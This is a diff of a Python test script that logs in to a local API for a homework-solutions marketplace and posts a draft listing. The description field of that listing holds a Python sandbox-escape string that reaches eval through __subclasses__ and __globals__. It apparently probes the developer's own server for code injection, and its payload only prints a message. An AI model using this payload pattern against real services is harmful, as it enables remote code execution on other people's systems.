@@ -5,40 +5,44 @@ from requests_toolbelt import MultipartEncoder
 # 1. Получение токена
 response1 = requests.post(
     "http://localhost:8000/token",
-    data={"username": "1", "password": "1"},
+    data={"username": "2", "password": "2"},
     headers={"Content-Type": "application/x-www-form-urlencoded"}
 )
 token = response1.json()["access_token"]
 
-print(token)
 
-# # 2. Подготовка данных
-# gdz_payload= {
-#     "description": "Решение задач по математике",
-#     "full_description": "Упражнение 1",
-#     "price": 100,
-#     "category": "Школа_Физика",
-#     "content_text": "цветочек"
-# }
-#
-#
-# response = requests.post(
-#     "http://localhost:8000/gdz/create",
-#     files={
-#         "content_file": open("solution.png", "rb"),
-#     },
-#     data={
-#         "gdz_str": json.dumps(gdz_payload, ensure_ascii=False)
-#     },
-#     headers={
-#         "Authorization": f"Bearer {token}",
-#     }
-# )
-#
-# print(f"Status Code: {response.status_code}")
-# print(response.json())
+url = "http://localhost:8000/gdz/save_draft"
 
-response3 = requests.get(
-    "http://localhost:8000/images/036265f4-3f8f-4471-897a-fdbbcdd4a2b4.png",
-)
-print(response3)
+malicious_description = "''. __class__ . __base__ . __subclasses__ ()[next(i for i, c in enumerate(__class__.__base__.__subclasses__()) if c.__name__ == 'function')] . __init__ . __globals__ ['__builtins__'] ['eval'] ('print(\"RCE executed\")')"
+
+gdz_data = {
+    "description": malicious_description,
+    "full_description": "Test full description",
+    "category": "math",
+    "subject": "algebra",
+    "content_text": "Sample content",
+    "price": 0,
+    "is_elite": False,
+    "gdz_id": None
+}
+
+data = {
+    "gdz_str": json.dumps(gdz_data)
+}
+
+headers = {
+    "Authorization": f"Bearer {token}"
+}
+
+try:
+    response = requests.post(url, data=data, headers=headers)
+    response.raise_for_status()
+    print("Ответ сервера:", response.json())
+except requests.exceptions.HTTPError as e:
+    print("HTTP ошибка:", e.response.status_code, e.response.text)
+except requests.exceptions.RequestException as e:
+    print("Ошибка запроса:", str(e))
+
+print("A")
+
+
